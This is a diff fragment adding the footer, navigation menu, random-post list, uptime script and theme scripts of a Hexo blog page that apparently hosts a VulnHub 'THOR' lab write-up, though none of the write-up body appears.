+      <span class="exturl item about" data-url="aHR0cHM6Ly90Lm1lL24xaDFsMTU3" title="https:&#x2F;&#x2F;t.me&#x2F;n1h1l157"><i class="ic i-address-card"></i></span>
+      <span class="exturl item email" data-url="bWFpbHRvOjEyMjgwNTc4NjlAcXEuY29t" title="mailto:1228057869@qq.com"><i class="ic i-envelope"></i></span>
+      <span class="exturl item facebook" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDA4NDUzNzQwNTEzNw==" title="https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100084537405137"><i class="ic i-facebook"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-clipboard"></i>书架</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/books/LITERATURE/" rel="section"><i class="ic i-fedora"></i>LITERATURE</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/books/VULNHUB/" rel="section"><i class="ic i-android"></i>X_T-VULNHUB</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/books/XIAODI/" rel="section"><i class="ic i-opera"></i>XIAODI-SAFE</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2023/07/01/VULNHUB/118%20JANGOW/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2023/07/01/VULNHUB/123%20KEYRING/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%B0%8F%E8%AF%B4/" title="分类于 小说">小说</a>
+</div>
+
+    <span><a href="/2023/07/01/BOOK/8%E3%80%8A%E8%80%B6%E7%A8%A3%E6%89%8B%E7%A8%BF%E4%B9%8B%E8%BF%B7%E3%80%8B%E6%AC%A7%E6%96%87%C2%B7%E5%8D%8E%E8%8E%B1%E5%A3%AB/" title="《耶稣手稿之迷》欧文·华莱士">《耶稣手稿之迷》欧文·华莱士</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/01/VULNHUB/101%20EVM/" title="VULNHUB 1 EVM">VULNHUB 1 EVM</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2023/07/01/BOOK/3%E3%80%8A%E5%B9%B3%E5%87%A1%E7%9A%84%E4%B8%96%E7%95%8C%E3%80%8B%E8%B7%AF%E9%81%A5/" title="《平凡的世界》路遥">《平凡的世界》路遥</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/01/VULNHUB/105%20EARTH/" title="VULNHUB 5 EARTH">VULNHUB 5 EARTH</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
+</div>
+
+    <span><a href="/2023/07/01/BOOK/67%E3%80%8A%E8%8B%8F%E8%8F%B2%E7%9A%84%E4%B8%96%E7%95%8C%E3%80%8B%E4%B9%94%E5%BE%B7%E5%9D%A6%C2%B7%E8%B4%BE%E5%BE%B7/" title="《苏菲的世界》乔德坦·贾德">《苏菲的世界》乔德坦·贾德</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/01/VULNHUB/114%20ICA/" title="VULNHUB 14 ICA">VULNHUB 14 ICA</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/01/VULNHUB/138%20BLUESOMKE/" title="VULNHUB BLUESOMKE">VULNHUB BLUESOMKE</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/01/VULNHUB/146%20NEMESIS/" title="VULNHUB NEMESIS">VULNHUB NEMESIS</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%B0%8F%E8%AF%B4/" title="分类于 小说">小说</a>
+</div>
+
+    <span><a href="/2023/07/01/BOOK/69%E3%80%8A%E6%97%A0%E5%B0%BD%E4%B8%96%E7%95%8C%E3%80%8B%E8%82%AF%C2%B7%E7%A6%8F%E8%8E%B1%E7%89%B9/" title="《无尽世界》肯·福莱特">《无尽世界》肯·福莱特</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/01/VULNHUB/135%20HACKABLE3/" title="VULNHUB HACKABLE3">VULNHUB HACKABLE3</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">.N1h1l157 @ Phut Hon</span>
+  </div>
+
+<!--   自定义开启一个网站的运行时间 -->
+  <div class="site-uptime">
+    Site uptime: <span id="site-uptime"></span>
+  </div>
+  <script>
+    var siteUptimeElement = document.getElementById('site-uptime');
+    var siteSetupDate = new Date('2023-03-18'); // 替换为您的网站具体创建日期，格式为 'YYYY-MM-DD'
+    setInterval(function() {
+      var currentTime = new Date();
+      var uptime = formatUptime(currentTime - siteSetupDate);
+      siteUptimeElement.textContent = uptime;
+    }, 1000);
+
+    function formatUptime(milliseconds) {
+      var seconds = Math.floor(milliseconds / 1000);
+      var minutes = Math.floor(seconds / 60);
+      var hours = Math.floor(minutes / 60);
+      var days = Math.floor(hours / 24);
+
+      var uptime = '';
+      if (days > 0) {
+        uptime += days + '天 ';
+      }
+      if (hours > 0) {
+        uptime += (hours % 24) + '时 ';
+      }
+      if (minutes > 0) {
+        uptime += (minutes % 60) + '分 ';
+      }
+      uptime += (seconds % 60) + '秒';
+
+      return uptime;
+    }
+  </script>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/07/01/VULNHUB/119 THOR/',
+    favicon: {
+      show: "Cryp71c3",
+      hide: "十年磨一剑"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
